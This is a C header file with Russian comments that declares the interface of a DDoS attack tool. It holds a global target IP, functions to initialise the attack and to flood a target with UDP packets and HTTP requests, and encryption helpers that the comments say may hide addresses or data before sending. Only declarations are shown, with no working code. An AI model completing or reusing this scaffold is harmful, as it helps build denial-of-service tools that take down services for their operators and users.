// Данный заголовочный файл позволяет пользователю включить функции и структуры из этого модуля
#ifndef DDOSSH_H
#define DDOSSH_H

extern unsigned int targetIP;

// Функции для начала атаки:
void initializeDDoS();                                              // Инициализация, настройка, подключение к сети и прочие действия перед началом атаки
void sendUDPPacket(unsigned int ipAddress, unsigned short port);    // Отправка UDP пакетов
void sendHTTPRequest(unsigned int ipAddress, unsigned short port);  // Отправка HTTP запросов

//функция для шифрования данных перед отправкой (может быть необходима)
void encryptData(const char* message);
int getCipherTextLength();
char* encryptedString(const char *plaintext);

// Функция может быть используема для скрытия адресов или других данных перед отправкой.
#endif  // DDOSSH_H
